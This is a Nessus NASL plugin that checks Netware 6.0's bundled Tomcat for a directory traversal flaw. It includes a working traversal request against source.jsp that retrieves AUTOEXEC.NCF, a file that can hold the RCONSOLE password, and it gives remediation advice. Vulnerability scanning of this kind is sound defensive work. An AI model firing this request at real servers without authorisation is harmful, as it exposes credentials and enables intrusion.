#
# This script was written by David Kyger <david_kyger@symantec.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
  script_id(12119);
  script_version ("$Revision: 1.3 $");
# script_bugtraq_id();
# script_cve_id("");

 name["english"] = "Netware 6.0 Tomcat source code viewer";
 script_name(english:name["english"]);
 
 desc["english"] = "
The Apache Tomcat server distributed with Netware 6.0 has a directory 
traversal vulnerability. As a result, sensitive information 
could be obtained from the Netware server, such as the RCONSOLE 
password located in AUTOEXEC.NCF.

Example : http://target/examples/jsp/source.jsp?%2e%2e/%2e%2e/%2e%2e/%2e%2e/system/autoexec.ncf
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the Netware 6.0 Tomcat source code viewer vulnerability";
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2004 David Kyger");
 family["english"] = "Netware";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

warning = string("
The Apache Tomcat server distributed with Netware 6.0 has a directory 
traversal vulnerability. As a result, sensitive information 
could be obtained from the Netware server, such as the RCONSOLE 
password located in AUTOEXEC.NCF.

The content of the AUTOEXEC.NCF follows:");

url = "/examples/jsp/source.jsp?%2e%2e/%2e%2e/%2e%2e/%2e%2e/system/autoexec.ncf";
 
port = get_http_port(default:80);

if(get_port_state(port))
 {
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req);
   if ("SYS:\" >< buf)
    {
     warning = warning + string("\n", buf) + "

Solution : Remove default files from the web server. Also, ensure the 
RCONSOLE password is encrypted and utilize a password protected 
screensaver for console access.

Risk factor : High";
     security_hole(port:port, data:warning);
    }
 }


